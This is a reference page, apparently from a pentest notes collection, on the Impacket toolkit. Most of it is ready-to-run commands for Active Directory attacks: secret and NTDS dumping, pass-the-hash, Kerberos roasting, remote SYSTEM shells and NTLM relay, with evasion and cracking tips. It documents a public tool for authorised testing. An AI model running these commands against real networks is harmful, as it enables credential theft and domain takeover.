# Impacket

> A collection of Python classes and ready-to-run scripts for working with
> Windows network protocols (SMB, MSRPC, Kerberos, NTLM). The backbone of most
> AD post-exploitation: dump secrets, roast tickets, relay NTLM, get a shell.

- **Link:** https://github.com/fortra/impacket
- **Type:** open source
- **Platform:** cross-platform (Python)

## Description

Impacket implements Windows network protocols from scratch in Python, and ships
dozens of example scripts that expose that power on the command line. Once you
hold *any* valid domain credential you can use it to enumerate GPP passwords,
extract SPNs and AS-REP-roastable accounts, dump the local SAM or the whole
domain NTDS.dit, relay coerced NTLM authentication, and execute commands
remotely (`psexec`, `wmiexec`, `smbexec`). On Kali the scripts are prefixed with
`impacket-` (e.g. `impacket-secretsdump`); from a source install they live in
`examples/` (e.g. `secretsdump.py`).

## Installation

```bash
# Preinstalled on Kali; otherwise
pipx install impacket
```

## Usage examples

Most scripts accept the `domain/user:password@target` target format, or
`-hashes LM:NT` for pass-the-hash.

```bash
# Dump local SAM + LSA secrets from a host (local admin required)
impacket-secretsdump 'corp.local/administrator:Passw0rd!@10.0.0.5'

# Pass-the-hash instead of a password
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'corp.local/administrator@10.0.0.5'

# DCSync the whole domain from the DC (needs replication rights / DA)
impacket-secretsdump 'corp.local/administrator:Passw0rd!@dc01.corp.local'

# Offline dump from registry hives pulled off a host (see AD workflow below)
impacket-secretsdump -system system.bin -security security.bin -sam sam.bin LOCAL

# Hunt for cleartext passwords in Group Policy Preferences (GPP)
impacket-Get-GPPPassword 'corp.local/jsmith:Passw0rd!@dc01.corp.local'
```

### Kerberos roasting

```bash
# Kerberoasting — request service tickets for accounts with an SPN
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 'corp.local/jsmith:Passw0rd!' -outputfile kerb.txt

# AS-REP roasting — accounts with "do not require preauth" (needs no creds for the target)
impacket-GetNPUsers -dc-ip 10.0.0.1 'corp.local/' -usersfile users.txt -no-pass -outputfile asrep.txt
```

### Remote command execution

```bash
# Interactive SYSTEM shell over SMB (noisy — drops a service)
impacket-psexec 'corp.local/administrator:Passw0rd!@10.0.0.5'

# Quieter alternative over WMI (no service/binary drop)
impacket-wmiexec 'corp.local/administrator:Passw0rd!@10.0.0.5'
```

### NTLM relay

```bash
# Relay coerced NTLM auth to a target that lacks SMB signing, dumping SAM
#   pair with Responder (SMB/HTTP servers turned OFF) — see responder.md
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

## Notes & references

- Ticket-cracking modes for Hashcat: **13100** (Kerberoast TGS-REP), **18200**
  (AS-REP) — see [Kerberos attacks](kerberos-attacks.md) and
  [Password Cracking & Hashing](../password-cracking/).
- `secretsdump` also appears in [Post-Exploitation](../post-exploitation/) for
  credential dumping; relaying pairs with [Responder](responder.md).
- Deep-dive on command execution:
  https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d
- NTDS enumeration: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
